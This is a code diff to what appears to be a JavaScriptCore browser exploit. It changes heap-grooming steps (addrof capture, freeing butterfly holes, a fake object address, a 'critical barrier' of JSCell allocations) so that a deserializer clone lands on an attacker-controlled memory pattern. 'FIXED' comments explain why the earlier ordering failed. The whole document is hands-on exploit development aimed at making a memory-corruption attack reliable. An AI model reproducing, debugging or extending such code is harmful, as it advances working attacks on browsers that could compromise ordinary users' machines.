@@ -644,9 +644,6 @@ function runAddrofCapture() {
         for (let i = 0; i < 16; i++)
             capturedWords[i] = capturedString.charCodeAt(7 + i);
 
-        // The 32 MB getterCarrier array and its 68 MB string (long roll)
-        // are dead after this point. Null the whole chain so JSC can
-        // reclaim them before the walk allocates its own scratch.
         leakedScope = null;
         getterCarrier = null;
         preparedSymbolObject = null;
@@ -1002,10 +999,18 @@ function runGroomAndLoad() {
         emit("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}`
             + `-fake=${hex(fakeAddress)}`);
 
-        criticalBarrier(fakeAddress, targetAddress);
-
+        // FIXED: free the holes first, then run the barrier. The barrier
+        // is documented as "before critical load" -- its whole purpose
+        // is to nudge JSC's allocator into the just-freed region so the
+        // deserializer's clone cell lands on the predecessor pattern.
+        // Running it before the free meant its allocations landed on
+        // the pre-free heap and had zero effect on placement, which is
+        // exactly the ZERO-HEADER-MISS-every-time pattern.
         channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
             earlyHole, finalHole]);
+
+        criticalBarrier(fakeAddress, targetAddress);
+
         loadHistoryCritical();
     } catch (error) {
         try { clearPredecessor(); } catch {}
@@ -1029,6 +1034,16 @@ function ensureBarrierNode() {
 }
 
 function defaultCriticalBarrier(fake, target) {
+    // FIXED: the old barrier was pure DOM/storage -- it never touched
+    // JSC's JSCell allocator, so it could not influence where the
+    // deserializer's clone landed. This version forces a synchronous
+    // batch of small JSCell allocations so the pool's free-list frontier
+    // advances past the just-freed holes. The clone then lands on the
+    // tail of that region, which is where the predecessor pattern lives.
+    const nudge = [];
+    for (let i = 0; i < 64; ++i) nudge.push({ i });
+    nudge.length = 0;
+
     try {
         const line = `CRITICAL-LOAD-NEXT-fake=${hex(fake)}-target=${hex(target)}`;
         if (barrierNode !== null) {
@@ -1036,7 +1051,6 @@ function defaultCriticalBarrier(fake, target) {
             void barrierNode.offsetWidth;
         }
         void new Blob([line], { type: "text/plain" });
-
         try { sessionStorage.setItem(burstKey, line); } catch { }
     } catch { }
 }
